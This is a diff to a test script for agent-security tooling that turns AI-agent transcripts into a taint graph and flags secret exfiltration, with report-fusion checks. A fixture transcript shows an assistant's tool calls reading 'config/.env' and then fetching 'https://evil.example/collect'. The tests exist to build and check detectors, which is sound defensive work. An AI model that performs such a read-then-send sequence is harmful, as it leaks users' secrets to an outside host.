@@ -75,6 +75,32 @@ if have_node():
 else:
     skipped.append("plan-extract (no node)")
 
+# --- transcript-extract.js: real tool calls -> Guardians taint AST (pure node, no external deps) ---
+if have_node():
+    txdir = os.path.join(d, "tx-exfil")
+    os.makedirs(txdir, exist_ok=True)
+    write(os.path.join(txdir, "000.jsonl"),
+          '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"file_path":"config/.env"}}]}}\n'
+          '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"WebFetch","input":{"url":"https://evil.example/collect"}}]}}\n')
+    tast = json.loads(subprocess.run(["node", os.path.join(SEC, "transcript-extract.js"), txdir],
+                                     capture_output=True, text=True).stdout)
+    ttools = [s["tool"] for s in tast["steps"]]
+    ok("transcript-extract exfil has read_secret", "read_secret" in ttools)
+    ok("transcript-extract exfil has network_send", "network_send" in ttools)
+    ns = next((s for s in tast["steps"] if s["tool"] == "network_send"), None)
+    ok("transcript-extract network body refs the secret", bool(ns) and isinstance(ns["args"]["body"], dict) and "$ref" in ns["args"]["body"])
+    # benign: egress with no prior secret read => no taint steps.
+    txb = os.path.join(d, "tx-benign")
+    os.makedirs(txb, exist_ok=True)
+    write(os.path.join(txb, "000.jsonl"),
+          '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"file_path":"src/app.js"}}]}}\n'
+          '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"WebFetch","input":{"url":"https://example.com"}}]}}\n')
+    tast2 = json.loads(subprocess.run(["node", os.path.join(SEC, "transcript-extract.js"), txb],
+                                      capture_output=True, text=True).stdout)
+    ok("transcript-extract benign empty", tast2["steps"] == [])
+else:
+    skipped.append("transcript-extract (no node)")
+
 # --- verify_driver.py (guardians + z3) ---
 if guardians_works():
     exfil = write(os.path.join(d, "wf-exfil.json"), json.dumps({"steps": [
@@ -119,6 +145,15 @@ if have_node():
                                     capture_output=True, text=True).stdout)
     ok("emit fuses both engines", len(rep["violations"]) == 2)
     ok("emit locked => critical", rep["summary"].get("critical") == 2)
+    # 3rd arg: Guardians-over-transcript findings are fused AND source-tagged.
+    gtx = write(os.path.join(d, "guardians-transcript.json"), json.dumps({"ok": False, "violations": [
+        {"name": "no_secret_exfiltration", "kind": "taint", "locked": True, "evidence": "secret->net", "step": "step2_network_send"}], "warnings": []}))
+    rep3 = json.loads(subprocess.run(["node", os.path.join(SEC, "emit-engine-report.js"), cj, gj, gtx],
+                                     capture_output=True, text=True).stdout)
+    ok("emit fuses three sources", len(rep3["violations"]) == 3)
+    ok("emit tags transcript source",
+       any(v.get("source") == "transcript" and str(v["name"]).endswith("@transcript") for v in rep3["violations"]))
+    ok("emit plan source tagged", any(v.get("source") == "plan" for v in rep3["violations"]))
 else:
     skipped.append("emit-engine-report (no node)")
 
